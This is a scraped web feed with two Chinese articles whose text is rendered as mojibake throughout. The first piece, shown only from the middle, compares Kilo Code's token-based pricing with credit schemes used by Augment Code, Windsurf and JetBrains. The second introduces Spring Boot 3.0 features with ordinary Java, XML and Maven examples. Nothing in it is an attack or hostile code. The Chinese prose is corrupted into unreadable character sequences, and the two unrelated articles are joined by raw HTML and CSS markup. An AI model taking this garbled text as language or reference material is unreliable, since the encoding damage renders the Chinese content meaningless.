<p>ç›¸æ¯”ä¹‹ä¸‹,Kilo Code åœ¨æ¯æ¬¡ä¼šè¯æœŸé—´æ˜¾ç¤ºå…¨é¢çš„æˆæœ¬å’Œä½¿ç”¨æ•°æ®ï¼š</p>
<ul>
<li>èŠå¤©é¡¶éƒ¨çš„è¿è¡Œæˆæœ¬æ€»è®¡</li>
<li>æ¯æ¡æ¶ˆæ¯çš„æˆæœ¬æ˜ç»†</li>
<li>æ˜¾ç¤º AI reasoning æ­¥éª¤ã€checkpoints å’Œå·¥å…·ä½¿ç”¨çš„å¯è§†åŒ–è¿›åº¦æ¡</li>
<li>ç”¨äºæˆæœ¬éªŒè¯çš„ç²¾ç¡® token è®¡æ•°</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4555f412334442dba367511f6ca9f64b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767966980&amp;x-signature=TcC32A1%2BuG%2Ffn2ejLHiNGYLDsYE%3D" alt="Kilo Code å®æ—¶æˆæœ¬æ˜¾ç¤ºæ˜ç»†" loading="lazy"/></p>
<p>åœ¨ç¼–ç ä¼šè¯æœŸé—´,ä¸Šä¸‹æ–‡ç®¡ç†ä¸ä»…ä»…å…³ä¹æˆæœ¬ã€‚æ¨¡å‹é€šå¸¸åœ¨è¾¾åˆ°æŸäº›ä¸Šä¸‹æ–‡ä½¿ç”¨é˜ˆå€¼åè¡¨ç°æ›´å·®å¹¶å˜æ…¢ã€‚å½“ä½ èƒ½çœ‹åˆ°ä¸Šä¸‹æ–‡ä½¿ç”¨æƒ…å†µæ—¶,ä½ å°±çŸ¥é“ä½•æ—¶å‹ç¼©ä¸Šä¸‹æ–‡æˆ–å¼€å§‹æ–°èŠå¤©,ä»¥èŠ‚çœæˆæœ¬å¹¶æé«˜é€Ÿåº¦å’Œå“åº”è´¨é‡ã€‚</p>
<h2 data-id="heading-11">Credits vs åŸºäº Token çš„å®šä»·</h2>
<p>ç›¸æ¯”åŸºäº token çš„æ›¿ä»£æ–¹æ¡ˆ,credit ç³»ç»Ÿé€ æˆäº†æ ¹æœ¬æ€§çš„é™åˆ¶ï¼š</p>
<p><strong>Credits(Augment Code)ï¼š</strong></p>
<ul>
<li>æ¯æœˆè¿‡æœŸ,ä¸èƒ½ç»“è½¬</li>
<li>å¿…é¡»åœ¨ä¸çŸ¥é“ä½¿ç”¨éœ€æ±‚çš„æƒ…å†µä¸‹é¢„å…ˆè´­ä¹°</li>
<li>éšè—å®é™…æˆæœ¬(519 credits ç­‰äº $0.26,ä½†ä½ åœ¨ä»»åŠ¡ä¸­é€”æ°¸è¿œä¸ä¼šè®¡ç®—è¿™ä¸ª)</li>
<li>å°†ä½ é”å®šåœ¨å›ºå®šçš„æœˆåº¦æ–¹æ¡ˆä¸­</li>
<li>æ— æ³•è·¨ä¸åŒå·¥å…·æ¯”è¾ƒä»·æ ¼</li>
</ul>
<p><strong>åŸºäº Token çš„ BYOK(Kilo Code)ï¼š</strong></p>
<ul>
<li>ä»…ä¸ºå®é™…ä½¿ç”¨ä»˜è´¹</li>
<li>ä»¥å®é™…ç¾å…ƒæŸ¥çœ‹æˆæœ¬</li>
<li>ä½™é¢ä¸è¿‡æœŸ</li>
<li>æ ¹æ®å¤æ‚åº¦ä¸ºæ¯ä¸ªä»»åŠ¡åˆ‡æ¢æ¨¡å‹</li>
<li>ç«‹å³ä½¿ç”¨ä»»ä½•æä¾›å•†(è®¢é˜…æˆ–æŒ‰ token ä»˜è´¹)</li>
<li>åœ¨å…è´¹æœŸé—´å°è¯•å®éªŒæ€§æ¨¡å‹(å¦‚å½“å‰åœ¨ Kilo Code ä¸­å…è´¹çš„ MiniMax M2 æˆ– Grok Code Fast 1)</li>
</ul>
<p>credit ç³»ç»Ÿè§£å†³äº† Augment Code çš„ä¸šåŠ¡æŒ‘æˆ˜(å¯é¢„æµ‹çš„æ”¶å…¥,æ— ç»“è½¬è´Ÿå€º),ä½†ä¸ºéœ€è¦æˆæœ¬å¯è§æ€§å’Œçµæ´»æ€§çš„å¼€å‘è€…åˆ¶é€ äº†æ‘©æ“¦ã€‚</p>
<h2 data-id="heading-12">æ›´å¹¿æ³›çš„èƒŒæ™¯</h2>
<p>Augment Code åœ¨è¿™ä¸€è½¬å˜ä¸­å¹¶ä¸å­¤å•ã€‚å¤šä¸ª AI ç¼–ç åŠ©æ‰‹æœ€è¿‘å·²ç»ä»é€æ˜çš„åŸºäº token çš„å®šä»·è½¬å‘äº† credit ç³»ç»Ÿã€‚è¿™äº› credits é€šå¸¸ä¸èƒ½æ¸…æ¥šåœ°æ˜ å°„åˆ°å®é™…ä½¿ç”¨æƒ…å†µã€‚æœ‰äº›ä¸ç®¡å¤§å°éƒ½è®¡ç®—"prompts",å…¶ä»–çš„ä½¿ç”¨ä¸“æœ‰è®¡ç®—æ–¹æ³•,ä½¿æˆæœ¬æ¯”è¾ƒå˜å¾—ä¸å¯èƒ½ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ffc08feda37748ec9d34d3af7a9cabc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767966980&amp;x-signature=7Oi506FU04e5jFLuR70%2Bn%2BmGIuQ%3D" alt="Windsurf çš„åŸºäº credit çš„å®šä»·é¡µé¢" loading="lazy"/></p>
<p>è¿™ç§å…¨è¡Œä¸šçš„æ¨¡å¼ä¸ºå¼€å‘è€…åˆ¶é€ äº†å‡ ä¸ªé—®é¢˜ã€‚å½“æ¯ä¸ªå·¥å…·ä½¿ç”¨ä¸åŒçš„ credit å…¬å¼æ—¶,ä½ æ— æ³•æ¯”è¾ƒå·¥å…·ä¹‹é—´çš„æˆæœ¬ã€‚</p>
<p>æ¯æœˆè¿‡æœŸçš„é…é¢åˆ¶é€ äº†"ä¸ç”¨å°±æµªè´¹"çš„å‹åŠ›,è€Œä¸æ˜¯æ ¹æ®å®é™…éœ€æ±‚è¿›è¡Œä¼˜åŒ–ã€‚æœ€é‡è¦çš„æ˜¯,å½“ä½ ä¸çŸ¥é“ä¸œè¥¿å®é™…èŠ±è´¹å¤šå°‘æ—¶,ä½ æ— æ³•å°±å“ªäº›æ¨¡å‹ç”¨äºå“ªäº›ä»»åŠ¡åšå‡ºæ˜æ™ºçš„å†³å®šã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce63e91dd98540dc9aa76cafd4056201~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piv6a2U5Li45ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767966980&amp;x-signature=TYotoWHydT7iG1FK4rB7MvD3Lpw%3D" alt="JetBrains çš„åŸºäº credit çš„å®šä»·é¡µé¢" loading="lazy"/></p>
<p>æ”¯æŒ BYOK(Bring Your Own Key)çš„å¼€æºå·¥å…·ä¿ç•™äº†å¼€å‘è€…éœ€è¦çš„é€æ˜åº¦ã€‚ä½ å®æ—¶çœ‹åˆ°ç¡®åˆ‡çš„ token ä½¿ç”¨æƒ…å†µ,åªä¸ºæ¶ˆè€—çš„å†…å®¹ä»˜è´¹,å¹¶ä¸” tokens æ°¸ä¸è¿‡æœŸã€‚æ›´é‡è¦çš„æ˜¯,ä½ ä¿æŒäº†æ ¹æ®ä»»åŠ¡éœ€æ±‚å’Œé¢„ç®—é™åˆ¶åœ¨æ¨¡å‹å’Œæä¾›å•†ä¹‹é—´åˆ‡æ¢çš„è‡ªç”±,è€Œä¸æ˜¯ä¾›åº”å•†é”å®šã€‚</p>
<p>å‘ credits çš„è½¬å˜æ˜¾ç„¶æœ‰åˆ©äº AI ç¼–ç åŠ©æ‰‹å…¬å¸ï¼šå¯é¢„æµ‹çš„æœˆåº¦æ”¶å…¥,æ— ç»“è½¬ä¹‰åŠ¡,ç®€åŒ–çš„è®¡è´¹ã€‚ä½†å®ƒå‡å°‘äº†å¼€å‘è€…å¯¹æˆæœ¬å’Œå·¥å…·é€‰æ‹©çš„æ§åˆ¶ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot 3 å’Œ 4 çš„ç‰ˆæœ¬æ–°ç‰¹æ€§å’Œå‡çº§è¦ç‚¹]]></title>    <link>https://juejin.cn/post/7589920884309311514</link>    <guid>https://juejin.cn/post/7589920884309311514</guid>    <pubDate>2026-01-01T15:14:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589920884309311514" data-draft-id="7589978645135654922" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot 3 å’Œ 4 çš„ç‰ˆæœ¬æ–°ç‰¹æ€§å’Œå‡çº§è¦ç‚¹"/> <meta itemprop="keywords" content="åç«¯,Spring Boot,Java"/> <meta itemprop="datePublished" content="2026-01-01T15:14:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€çº¿å¤§ç "/> <meta itemprop="url" content="https://juejin.cn/user/3280598429340984"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot 3 å’Œ 4 çš„ç‰ˆæœ¬æ–°ç‰¹æ€§å’Œå‡çº§è¦ç‚¹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3280598429340984/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€çº¿å¤§ç 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T15:14:13.000Z" title="Thu Jan 01 2026 15:14:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">1. Spring Boot 3.0</h2>
<p>Spring Boot 3.0 æ˜¯ä¸€æ¬¡é‡å¤§çš„æ¡†æ¶æ¢ä»£ï¼Œå¸¦æ¥äº†è®¸å¤šé¢å‘æœªæ¥çš„æ–°ç‰¹æ€§ã€‚ä¸ºäº†å¿«é€ŸæŠŠæ¡æ ¸å¿ƒå˜åŒ–ï¼Œæˆ‘å°†å…¶ä¸»è¦ç‰¹æ€§ã€å…³é”®å˜åŒ–å’Œåº”ç”¨ä»·å€¼æ¢³ç†ä¸ºä¸‹è¡¨ï¼š</p>





















































<table><thead><tr><th align="left">ç‰¹æ€§ç±»åˆ«</th><th align="left">æ ¸å¿ƒç‰¹æ€§</th><th align="left">å…³é”®å˜åŒ– / ç®€è¦è¯´æ˜</th><th align="left">æ ¸å¿ƒä»·å€¼ä¸å½±å“</th></tr></thead><tbody><tr><td align="left"><strong>åŸºç¡€ä¸æ¶æ„</strong></td><td align="left"><strong>Java 17+ åŸºçº¿</strong></td><td align="left">å¼ºåˆ¶è¦æ±‚ Java 17 æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚</td><td align="left">åˆ©ç”¨ç°ä»£Javaç‰¹æ€§ï¼ˆå¦‚<strong>è®°å½•ç±»</strong>ã€<strong>å¯†å°ç±»</strong>ï¼‰ï¼Œæ¨åŠ¨ç”Ÿæ€å‡çº§ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>Jakarta EE 9+</strong></td><td align="left">åŒ…å‘½åç©ºé—´ä» <code>javax.*</code> è¿ç§»è‡³ <code>jakarta.*</code>ã€‚</td><td align="left">é€‚é…ä¼ä¸šçº§Javaæ–°æ ‡å‡†ï¼Œæ˜¯å‡çº§ä¸­æœ€å¸¸è§çš„ä»£ç ä¿®æ”¹ç‚¹ã€‚</td></tr><tr><td align="left"><strong>äº‘åŸç”Ÿä¸æ€§èƒ½</strong></td><td align="left"><strong>GraalVM åŸç”Ÿé•œåƒ</strong></td><td align="left">é›†æˆ AOT ç¼–è¯‘ï¼Œå¯å°†åº”ç”¨ç¼–è¯‘ä¸ºæœ¬åœ°å¯æ‰§è¡Œæ–‡ä»¶ã€‚</td><td align="left">å®ç°æ¯«ç§’çº§å¯åŠ¨ã€æ›´ä½å†…å­˜å ç”¨ï¼Œä¸º Serverless å’Œå®¹å™¨åŒ–å¸¦æ¥é©å‘½æ€§ä¼˜åŠ¿ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>å¢å¼ºå¯è§‚æµ‹æ€§</strong></td><td align="left">é€šè¿‡ <strong>Micrometer</strong> æä¾›æ›´å®Œå–„çš„æŒ‡æ ‡ã€è¿½è¸ªå’Œç›‘æ§é›†æˆã€‚</td><td align="left">å¼€ç®±å³ç”¨åœ°æ„å»ºå¯è§‚æµ‹æ€§ä½“ç³»ï¼Œæ˜¯å¾®æœåŠ¡è¿ç»´çš„åˆšéœ€ã€‚</td></tr><tr><td align="left"><strong>å¼€å‘ä½“éªŒ</strong></td><td align="left"><strong>å£°æ˜å¼HTTPå®¢æˆ·ç«¯ (<code>@HttpExchange</code>)</strong></td><td align="left">é€šè¿‡æ³¨è§£å£°æ˜HTTPæœåŠ¡æ¥å£ï¼Œç±»ä¼¼Feignä½†æ›´è½»é‡ã€‚</td><td align="left">æå¤§ç®€åŒ–æœåŠ¡é—´HTTPè°ƒç”¨ä»£ç ï¼Œç±»å‹å®‰å…¨ï¼Œå­¦ä¹ æˆæœ¬ä½ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>Problem Details API (RFC 7807)</strong></td><td align="left">æä¾›æ ‡å‡†åŒ–çš„HTTP APIé”™è¯¯å“åº”æ ¼å¼ã€‚</td><td align="left">ç”Ÿæˆæœºå™¨å¯è¯»ã€ç»“æ„åŒ–çš„é”™è¯¯ä¿¡æ¯ï¼Œæå‡APIå‹å¥½æ€§ä¸ä¸€è‡´æ€§ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>è‡ªåŠ¨é…ç½®æœºåˆ¶é©æ–°</strong></td><td align="left">ç”¨ <code>META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports</code> æ–‡ä»¶æ›¿ä»£æ—§çš„ <code>spring.factories</code>ã€‚</td><td align="left">å®ç°é…ç½®çš„<strong>é™æ€åŠ è½½</strong>ï¼Œæå‡åº”ç”¨å¯åŠ¨é€Ÿåº¦ã€‚</td></tr></tbody></table>
<h3 data-id="heading-1">1.1 æ ¸å¿ƒç‰¹æ€§è¯¦è§£ä¸ç¤ºä¾‹</h3>
<p>ä¸‹é¢ç”¨å…·ä½“ä»£ç å±•ç¤ºå‡ ä¸ªé‡è¦ç‰¹æ€§çš„ç”¨æ³•ã€‚</p>
<h4 data-id="heading-2">1.1.1. å£°æ˜å¼HTTPå®¢æˆ·ç«¯ (<code>@HttpExchange</code>)</h4>
<p>è¿™ä¸ªæ–°ç‰¹æ€§è®©æœåŠ¡é—´è°ƒç”¨åƒå†™<code>Controller</code>ä¸€æ ·ç®€å•ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. å£°æ˜æ¥å£ï¼šåƒå®šä¹‰Controllerä¸€æ ·å®šä¹‰è¦è°ƒç”¨çš„è¿œç¨‹æœåŠ¡</span>
<span class="hljs-meta">@HttpExchange(url = "/api/v1", accept = "application/json", contentType = "application/json")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserServiceClient</span> {
    <span class="hljs-meta">@GetExchange("/users/{id}")</span>
    User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span>;
    
    <span class="hljs-meta">@PostExchange("/users")</span>
    User <span class="hljs-title function_">createUser</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> User user)</span>;
}

<span class="hljs-comment">// 2. é…ç½®Beanï¼šé€šè¿‡å·¥å‚åˆ›å»ºä»£ç†å®ä¾‹</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ClientConfig</span> {
    <span class="hljs-meta">@Bean</span>
    UserServiceClient <span class="hljs-title function_">userServiceClient</span><span class="hljs-params">(WebClient.Builder builder)</span> {
        <span class="hljs-type">WebClient</span> <span class="hljs-variable">webClient</span> <span class="hljs-operator">=</span> builder.baseUrl(<span class="hljs-string">"http://user-service-host"</span>).build();
        <span class="hljs-keyword">return</span> HttpServiceProxyFactory.builder(WebClientAdapter.forClient(webClient))
                                      .build()
                                      .createClient(UserServiceClient.class);
    }
}

<span class="hljs-comment">// 3. ç›´æ¥ä½¿ç”¨ï¼šåƒæ³¨å…¥æ™®é€šBeanä¸€æ ·æ³¨å…¥å¹¶ä½¿ç”¨</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserServiceClient userServiceClient; <span class="hljs-comment">// æ³¨å…¥å£°æ˜çš„å®¢æˆ·ç«¯</span>
    
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">getOrderWithUser</span><span class="hljs-params">(Long orderId, Long userId)</span> {
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userServiceClient.getUserById(userId); <span class="hljs-comment">// ç›´æ¥è°ƒç”¨ï¼Œå¦‚åŒæœ¬åœ°æ–¹æ³•</span>
        <span class="hljs-comment">// ... å¤„ç†è®¢å•é€»è¾‘</span>
        <span class="hljs-keyword">return</span> order;
    }
}
</code></pre>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼šå¼ºç±»å‹ã€ä»£ç ç®€æ´ã€å‡å°‘æ¨¡æ¿ä»£ç ï¼Œæ— éœ€å…³å¿ƒåº•å±‚HTTPç»†èŠ‚ã€‚</p>
<h4 data-id="heading-3">1.1.2. æ ‡å‡†åŒ–çš„é”™è¯¯å“åº” (RFC 7807)</h4>
<p>Spring Boot 3.0 ç°åœ¨æ”¯æŒç”Ÿæˆç¬¦åˆè¡Œä¸šæ ‡å‡†çš„é”™è¯¯å“åº”ä½“ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å½“æŠ›å‡ºå¼‚å¸¸æ—¶ï¼ŒSpring Boot 3.0 é»˜è®¤å¯ä»¥ç”Ÿæˆå¦‚ä¸‹ç»“æ„çš„JSONå“åº”</span>
<span class="hljs-comment">// ä¼ ç»Ÿçš„è‡ªå®šä¹‰é”™è¯¯æ ¼å¼ï¼š{"message": "ç”¨æˆ·ä¸å­˜åœ¨", "error": "Not Found"}</span>
<span class="hljs-comment">// æ–°çš„æ ‡å‡†Problem Detailæ ¼å¼ï¼š</span>
{
    <span class="hljs-string">"type"</span>: <span class="hljs-string">"about:blank"</span>,
    <span class="hljs-string">"title"</span>: <span class="hljs-string">"Not Found"</span>,
    <span class="hljs-string">"status"</span>: <span class="hljs-number">404</span>,
    <span class="hljs-string">"detail"</span>: <span class="hljs-string">"ç”¨æˆ·IDä¸º123çš„ç”¨æˆ·ä¸å­˜åœ¨"</span>,
    <span class="hljs-string">"instance"</span>: <span class="hljs-string">"/users/123"</span>
}
</code></pre>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼šæä¾›ç»Ÿä¸€ã€æœºå™¨å¯è¯»çš„é”™è¯¯æ ¼å¼ï¼Œä¾¿äºAPIæ¶ˆè´¹è€…ï¼ˆå°¤å…¶æ˜¯å‰ç«¯ï¼‰è¿›è¡Œæ ‡å‡†åŒ–å¤„ç†ã€‚</p>
<h4 data-id="heading-4">1.1.3. åˆ©ç”¨ç°ä»£Javaç‰¹æ€§ï¼ˆJava 17+ï¼‰</h4>
<p>å‡çº§åˆ°Java 17åŸºçº¿åï¼Œä½ å¯ä»¥åœ¨ä»£ç ä¸­å……åˆ†åˆ©ç”¨æ–°è¯­æ³•ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨è®°å½•ç±» (Records) ä½œä¸ºDTOæˆ–å€¼å¯¹è±¡ï¼šè‡ªåŠ¨ç”Ÿæˆæ„é€ å™¨ã€getterã€equalsã€hashCodeå’ŒtoString</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title class_">UserDTO</span><span class="hljs-params">(Long id, String name, String email)</span> {} <span class="hljs-comment">// ä¸€è¡Œé¡¶è¿‡å»å‡ åè¡Œ</span>

<span class="hljs-comment">// ä½¿ç”¨å¯†å°ç±» (Sealed Classes) ç²¾ç¡®æ§åˆ¶ç»§æ‰¿å±‚æ¬¡ï¼Œå¢å¼ºé¢†åŸŸæ¨¡å‹å®‰å…¨æ€§</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">PaymentResult</span> <span class="hljs-keyword">permits</span> PaymentSuccess, PaymentFailed {
    <span class="hljs-comment">// åªå…è®¸è¿™ä¸¤ä¸ªç±»å®ç°æ­¤æ¥å£</span>
}
<span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title class_">PaymentSuccess</span><span class="hljs-params">(String transactionId)</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PaymentResult</span> {}
<span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title class_">PaymentFailed</span><span class="hljs-params">(String errorCode)</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PaymentResult</span> {}
</code></pre>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼šä»£ç æ›´ç®€æ´ã€æ„å›¾æ›´æ˜ç¡®ã€æ›´å®‰å…¨ã€‚</p>
<h4 data-id="heading-5">1.1.4. é¢å‘åŸç”Ÿç¼–è¯‘ (GraalVM Native Image)</h4>
<p>è¿™æ˜¯è¿ˆå‘äº‘åŸç”Ÿæè‡´æ€§èƒ½çš„å…³é”®ç‰¹æ€§ã€‚</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- åœ¨pom.xmlä¸­ï¼Œä½¿ç”¨Spring Bootæ’ä»¶å³å¯è½»æ¾æ„å»ºåŸç”Ÿé•œåƒ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.graalvm.buildtools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>native-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨Mavenå‘½ä»¤ç¼–è¯‘æˆæœ¬åœ°å¯æ‰§è¡Œæ–‡ä»¶</span>
mvn -Pnative native:compile
<span class="hljs-comment"># ç¼–è¯‘åç”Ÿæˆä¸€ä¸ªç‹¬ç«‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¦‚`myapp`ï¼‰ï¼Œå¯ä»¥ç›´æ¥è¿è¡Œ</span>
./target/myapp
</code></pre>
